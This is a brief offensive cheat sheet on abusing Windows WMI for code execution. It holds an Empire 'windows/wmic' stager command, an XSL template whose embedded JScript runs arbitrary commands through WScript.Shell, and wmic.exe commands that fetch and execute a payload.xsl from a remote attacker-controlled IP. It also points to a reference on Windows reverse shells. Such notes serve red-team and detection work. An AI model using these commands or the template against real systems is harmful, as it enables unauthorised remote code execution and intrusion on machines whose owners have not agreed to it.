# WMI

## 01 - Generate Payloads

### 1.1 - Empire

TODO: Fill this info

```
(Empire) > usestager windows/wmic
```

### 1.2 - WMI Template

```xml
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("<commands>");
	]]> </ms:script>
</stylesheet>
```

## 02 - Execute Payloads

Execute a script contained in the target `.xsl` file hosted on a remote server.

```
C:\> wmic.exe os get /format:"http[s]://<IP>[:PORT]/payload.xsl"

C:\> wmic.exe process get brief /format:"http[s]://<IP>[:PORT]/payload.xsl"
```

---
## References

### Hacktricks

- [Hacktricks: Windows Reverse Shells](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/reverse-shells/windows.html)